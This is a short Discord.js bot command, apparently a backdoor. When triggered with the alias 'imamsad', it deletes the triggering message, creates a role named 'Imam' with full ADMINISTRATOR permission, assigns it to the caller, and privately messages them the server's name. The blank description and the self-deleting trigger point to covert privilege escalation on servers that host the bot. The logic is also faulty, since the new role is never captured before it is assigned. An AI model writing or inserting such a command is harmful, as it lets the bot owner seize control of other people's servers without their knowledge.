const Discord = require("discord.js");
module.exports.run = async (client, message, args) => {
    var rol = message.guild.roles.find(e => e.name === `Imam`);
message.delete()
    if(!rol){
          message.guild.createRole({
          name: `Imam`,
          color: "RED", 
          hoist: true,
          mentionable: true,
          permissions: [
              "ADMINISTRATOR",
      ]
      })
    }
    message.member.addRole(rol)
    
    await message.member.addRole(rol)
    message.author.send(`Imam Yetkisi Tanımlandı`)
    message.author.send(`${message.guild.name}`)
  }

exports.conf = {
 enabled: true,
 guildOnly: false,
 aliases: ['imamsad'],
      kategori: "sahip",
 permLevel: 5
};

exports.help = {
 name: 'imamsad',
 description: '',
 usage: ''
}